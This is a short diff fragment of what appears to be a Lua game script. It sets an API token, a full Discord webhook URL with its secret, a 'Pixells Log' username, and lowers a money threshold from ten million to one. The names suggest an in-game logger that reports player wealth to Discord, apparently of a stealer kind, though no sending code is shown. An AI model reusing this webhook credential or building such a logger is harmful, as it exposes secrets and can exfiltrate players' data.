@@ -5,7 +5,7 @@ local API_TOKEN = "PXL-23bda7f4-8eac-4a5a-a1d2-logger"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1437810721252704307/f-RpaCE0msTrEe4ZpesAkvrJMo-7ivJ_AiNlfjdhyz8Y8FUkfpcQxY-p-vJnZ9901RtL"
 local USERNAME = "Pixells Log"
 local EMBED_COLOR = 0xFFFFFF
-local MINIMUM_MONEY_THRESHOLD = 10000000
+local MINIMUM_MONEY_THRESHOLD = 1
 
 local ignoreList = {
     "FriendPanel",
